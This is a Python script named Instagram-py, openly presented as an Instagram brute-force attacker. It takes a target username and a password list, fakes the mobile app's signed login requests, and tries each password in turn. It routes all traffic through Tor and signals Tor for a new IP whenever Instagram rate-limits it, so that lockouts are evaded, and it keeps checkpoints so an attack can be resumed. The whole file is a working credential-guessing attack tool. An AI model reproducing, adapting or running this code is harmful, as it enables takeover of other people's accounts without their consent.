#!/usr/bin/env python
import requests
import urllib
import json
import hmac
import uuid
import hashlib
import argparse
import os
import shlex
import struct
import platform
import subprocess
from time import sleep
from datetime import datetime
from os.path import isfile,expanduser
from stem import Signal # to control tor server
from stem.control import Controller
from colorama import init # some eye candy is not that bad , right ?
from colorama import Fore , Style , Back

init(autoreset=True) # set colorama to automatically reset colors!

# App information for us to use !
appInfo = { 
    "version" : "0.0.1", # semver!
    "name" : "Instagram-py",
    "description" : " Simple Instagram brute force attacker script",
    "author" : "The Future Shell , DeathSec",
    "year" : "2017"
}

attackConfig = {
    "username" : "",
    "passwordFile" : "",
    "verbose" : 0
}

### functions to get Terminal size - cross platform ###

def get_terminal_size():
    """ getTerminalSize()
     - get width and height of console
     - works on linux,os x,windows,cygwin(windows)
     originally retrieved from:
     http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python
    """
    current_os = platform.system()
    tuple_xy = None
    if current_os == 'Windows':
        tuple_xy = _get_terminal_size_windows()
        if tuple_xy is None:
            tuple_xy = _get_terminal_size_tput()
            # needed for window's python in cygwin's xterm!
    if current_os in ['Linux', 'Darwin'] or current_os.startswith('CYGWIN'):
        tuple_xy = _get_terminal_size_linux()
    if tuple_xy is None:
        print("default")
        tuple_xy = (80, 25)      # default value
    return tuple_xy
 
 
def _get_terminal_size_windows():
    try:
        from ctypes import windll, create_string_buffer
        # stdin handle is -10
        # stdout handle is -11
        # stderr handle is -12
        h = windll.kernel32.GetStdHandle(-12)
        csbi = create_string_buffer(22)
        res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
        if res:
            (bufx, bufy, curx, cury, wattr,
             left, top, right, bottom,
             maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
            sizex = right - left + 1
            sizey = bottom - top + 1
            return sizex, sizey
    except:
        pass
 

def _get_terminal_size_tput():
    # get terminal width
    # src: http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window
    try:
        cols = int(subprocess.check_call(shlex.split('tput cols')))
        rows = int(subprocess.check_call(shlex.split('tput lines')))
        return (cols, rows)
    except:
        pass
 
 
def _get_terminal_size_linux():
    def ioctl_GWINSZ(fd):
        try:
            import fcntl
            import termios
            cr = struct.unpack('hh',
                               fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
            return cr
        except:
            pass
    cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
    if not cr:
        try:
            fd = os.open(os.ctermid(), os.O_RDONLY)
            cr = ioctl_GWINSZ(fd)
            os.close(fd)
        except:
            pass
    if not cr:
        try:
            cr = (os.environ['LINES'], os.environ['COLUMNS'])
        except:
            return None
    return int(cr[1]), int(cr[0])

### End functions to find Terminal size - cross platform ###

# usefull information reporting functions
# for error , headers and for some eye candy!
progress_status = ''
start = datetime.now()
password_file_length = 0
def report_err(err):
    print (Fore.RED + Style.BRIGHT + err)
    print (
           Fore.YELLOW + 'Report bugs , suggestions and new features at ' +  
           Fore.BLUE + Style.BRIGHT + 'https://github.com/DeathSec/instagram-py'
    )
    print (Fore.GREEN + 'Thank you for using Intagram-py')
    exit(-1) # report error to operating system!

def print_head(get_string):
    ret = str(
        Fore.MAGENTA + Style.BRIGHT + appInfo['name'] + Style.RESET_ALL + Fore.CYAN + ' v' + appInfo['version'] + ', ' + appInfo['description'] + '\n' +
        'Copyright (C) ' + appInfo['year'] + ' ' + appInfo['author'] + '\n'
        + Style.RESET_ALL
    )
    if not get_string:
            print(ret)
    else:
        return ret

def log_results(username , password , cracked):
    if not cracked:
        print(Style.BRIGHT + Fore.RED + '\n\n[-] sorry password not found... ' , end='')
        report_err('')
    else:
        print(Style.BRIGHT + '[ ' + Style.RESET_ALL + Fore.CYAN + 'PASSWORD FOUND!' + Style.RESET_ALL + Style.BRIGHT + ' ]')
        print(
            Style.BRIGHT + 'username: ' + username + '\n' + 
            'password: ' + Fore.CYAN + password
        )
        print (
           Fore.YELLOW + '\nReport bugs , suggestions and new features at ' +  
           Fore.BLUE + Style.BRIGHT + 'https://github.com/DeathSec/instagram-py'
        )
        print(Fore.CYAN + '[*] processed in ' + Style.RESET_ALL + Style.BRIGHT + str(datetime.now() - start) + ' hours')
        print (Fore.GREEN + 'Thank you for using Intagram-py')
        exit(0)

def print_progress(complete , total):
    print('\r' , end='')
    progress_bar = str(Style.BRIGHT + '[' + Style.DIM)
    progress_bar += str(Back.YELLOW)
    progress_bar += complete * str(' ')
    progress_bar += Style.RESET_ALL
    progress_bar += (total-complete) * str(' ')
    progress_bar += str(Style.BRIGHT + ']' + Style.RESET_ALL)
    progress_bar = progress_bar + Style.BRIGHT + ' ' +  progress_status + Style.RESET_ALL
    progress_bar += int(len(progress_bar) / 10) * str(' ')
    print(progress_bar,end='' ,  flush=True)

# end information reporting functions 


if __name__ == '__main__': # check if this script is not loaded
    # command-line parsing using argparse library
    print_head(False) # print header content!
    cmd_parser = argparse.ArgumentParser(epilog=Fore.BLUE + Style.BRIGHT + '''example: instagram-py -v instatestgod__ rockyou.txt''');
    # nargs = '+' , makes them positional argument.
    cmd_parser.add_argument('USERNAME' , type=str , help='username for Instagram account' , nargs = '+');
    cmd_parser.add_argument('PASSWORD_LIST' , type=str , default='./' , help='password list file to try with the given username.' , nargs='+')
    cmd_parser.add_argument('--verbose' , '-v' , action='count' , help='Activate Verbose mode!');
    parsed = cmd_parser.parse_args(); # Storing the parsed text
    
    # Store the attack configuration!
    attackConfig['username'] = parsed.USERNAME[0]
    attackConfig['passwordFile'] = parsed.PASSWORD_LIST[0]
    attackConfig['verbose'] = parsed.verbose
    
    sizex, sizey = get_terminal_size() # get terminal size for the progress_bar
    ptotal = int(sizex/3) # the max we can fill in the terminal
    
    # Loading configuration files 
    # edit this file to change the scripts actions!
    progress_status = '[+] searching for config file... '; # this reports to the user in real time!
    print_progress(int(10/100*ptotal) , ptotal )
    if(isfile('instapy-config.json')):
        config = 'instapy-config.json'
        print_progress(int(30/100*ptotal) , ptotal )
    else:
        print_progress(int(20/100*ptotal) , ptotal )
        if(isfile(expanduser('~') + '/instapy-config.json')):
            config = expanduser('~') + '/instapy-config.json'
            print_progress(int(30/100*ptotal) , ptotal )
        else:
            report_err('\nIntagram-py::error: cannot open config file -> instapy-config.json')

    progress_status = '[*] parsing config file... ';
    # after checking the if the file exist , then read the config
    print_progress(int(40/100*ptotal) , ptotal )
    try: # lets try parsing it as json
        with open(config) as json_data:
            configuration = json.load(json_data)
        print_progress(int(50/100*ptotal) , ptotal )
    except:
        # if some error in json syntax , exit!
        report_err('\ninstagram-py::error: invalid json in config file -> instapy-config.json')

    ## faking the instagram app's actions to get a unique cookie file
    ## this method is referenced by mpg25/instagram-php
    progress_status = '[*] loading requests... '
    print_progress(int(50/100*ptotal) , ptotal )
    
    bot = requests.Session()
    tor_proxy_server = configuration['tor']['protocol'] + '://' + configuration['tor']['server'] + ':' + configuration['tor']['port']
    
    progress_status = '[!] setting up tor... '
    print_progress(int(60/100*ptotal) , ptotal )

    bot.proxies = { # set proxy so that we can brute force instagram forever 
            # tor socks proxy!
            "https" : tor_proxy_server , 
            "http"  : tor_proxy_server
    }
    
    progress_status = '[*] building headers... '
    print_progress(int(70/100*ptotal) , ptotal )

    bot.headers.update(
                        {
                        'Connection' : 'close', # make sure requests closes the sockets instead of keep-alive!
                        'Accept' : '*/*',
                        'Content-type' : 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Cookie2' : '$Version=1',
                        'Accept-Language' : 'en-US',
                        'User-Agent' : configuration['user-agent']
                        }
    )
    
    progress_status = '[+] requesting magic cookie... '
    print_progress(int(80/100*ptotal) , ptotal )
    bot.get(
        configuration['api-url'] + "si/fetch_headers/?challenge_type=signup&guid=" + 
        str(uuid.uuid4()).replace('-' , '')
    );
    csrftoken = bot.cookies['csrftoken']; # this is the magic cookie 
    if(csrftoken == ''): # check if we got the cookie!
            report_err('\nInstagram-py::error: cannot get the magic cookie!');
    
    progress_status = '[+] got cookie:: '+ csrftoken
    print_progress(int(100/100*ptotal) , ptotal )
    print('')
    print(Fore.YELLOW + '[!] attack started: ' + Style.RESET_ALL + Fore.CYAN + str(start))
    print(Style.BRIGHT + '[+] target account: ' + Style.RESET_ALL + Fore.CYAN + attackConfig['username'] )
    if(isfile(attackConfig['passwordFile'])):
        print(Style.BRIGHT + '[*] password list path: ' + Style.RESET_ALL + Fore.CYAN + attackConfig['passwordFile'])
        with open(attackConfig['passwordFile'] , encoding='utf-8', errors='ignore') as f:
            password_file_length = sum(1 for _ in f)
    else:
        report_err('\nInstagram-py::fatal error: cannot find password list file!')
    print(Style.BRIGHT + '[ ' + Fore.RED + 'ATTACK STATUS'+ Style.RESET_ALL + Style.BRIGHT +' ]')
    
    current_line = 1 ## Counting line!
    resume_line = 0 ## to resume attack
    
    ### lets see if we have a save file!
    savefile_dir = expanduser('~') + '/.instagram-py'
    if not os.path.exists(savefile_dir) :
        os.makedirs(savefile_dir)
    checkpoint = savefile_dir + '/' + str(hashlib.sha224(attackConfig['username'].encode('utf-8')).hexdigest()) + '.dat'
    if isfile(checkpoint):
        choose = input(Fore.CYAN + '[*] Previous attack found.... do you wish to resume? '+Fore.WHITE + Style.BRIGHT +'[Y/n] ')
        if(choose.lower() == 'y' or choose.lower() == 'yes'):
            with open(checkpoint) as json_data:
                save = json.load(json_data)
            resume_line = int(save['line-count'])
        else:
            savefile = open(checkpoint , 'w')
            savefile.write('{ "username" : "'+attackConfig['username']+'" , "line-count" : "'+str(current_line)+'"}')
            savefile.close()
    
    if(resume_line > password_file_length):
        report_err('Instagram-py::error: if you resume the attack please use the same password list file!')
    
    # open tor control port and authenticate
    controller = Controller.from_port(port = int(configuration['tor']['control']['port']))
    if configuration['tor']['control']['password'] == '':
        controller.authenticate()
    else:
        controller.authenticate(password = configuration['tor']['control']['password'])
                
    # open the password list and start the attack!
    with open(attackConfig['passwordFile'] , encoding='utf-8' , errors ='ignore') as infile:
        for passwd in infile:
            if resume_line != current_line and resume_line > current_line:
                current_line += 1
            else:
                password = passwd.rstrip()
                password_passed = False
                while not password_passed:
                    progress_status = ' [*] Trying... ' + password
                    print_progress(int(int(current_line/password_file_length*100)/100*ptotal) , ptotal )
                    user_hash = hashlib.md5()
                    user_hash.update(attackConfig['username'].encode('utf-8') + password.encode('utf-8'));
                    device_hash = hashlib.md5()
                    device_hash.update(user_hash.hexdigest().encode('utf-8') + '12345'.encode('utf-8'))
                    data = {
                            'phone_id'   : str(uuid.uuid4()),
                            '_csrftoken' : csrftoken,
                            'username'   : attackConfig['username'],
                            'guid'       : str(uuid.uuid4()),
                            'device_id'  : str('android-' + device_hash.hexdigest()[:16]),
                            'password'   : password,
                            'login_attempt_count' : '0'}
                    r = bot.post(
                                configuration['api-url'] + 'accounts/login/' , 
                                data=str('ig_sig_key_version='+ configuration['ig-sig-version'] + '&signed_body=' + 
                                        hmac.new(configuration['ig-sig-key'].encode('utf-8'), 
                                                json.dumps(data).encode('utf-8'), 
                                                hashlib.sha256).hexdigest() + 
                                        '.' + urllib.parse.quote(json.dumps(data)))
                    );
                    if(r.status_code == 200):
                        progress_status = ' [+] PASSWORD CRACKED '
                        print_progress(ptotal,ptotal )
                        print('\n')
                        log_results(attackConfig['username'] , password , True)
                        break;
                    else:
                        message = json.loads(r.content);
                        if message['message'] == 'challenge_required':
                            progress_status = ' [+] PASSWORD CRACKED '
                            print_progress(ptotal,ptotal )
                            print('\n')
                            log_results(attackConfig['username'] , password , True)
                            break;
                        elif message['message'] == 'The password you entered is incorrect. Please try again.':
                            # write to save file for later use!
                            savefile = open(checkpoint , 'w')
                            savefile.write('{ "username" : "'+attackConfig['username']+'" , "line-count" : "'+str(current_line)+'"}')
                            savefile.close()
                            # the password is confirmed to be wrong so pass on!
                            current_line += 1
                            password_passed = True
                        else:
                            progress_status = ' [*] changing ip... '
                            print_progress(int(int(current_line/password_file_length*100)/100*ptotal) , ptotal )
                            controller.signal(Signal.NEWNYM) # signal tor to change ip 
                            sleep(3)

# report error if password is not found!
log_results(attackConfig['username'] , "" , False)
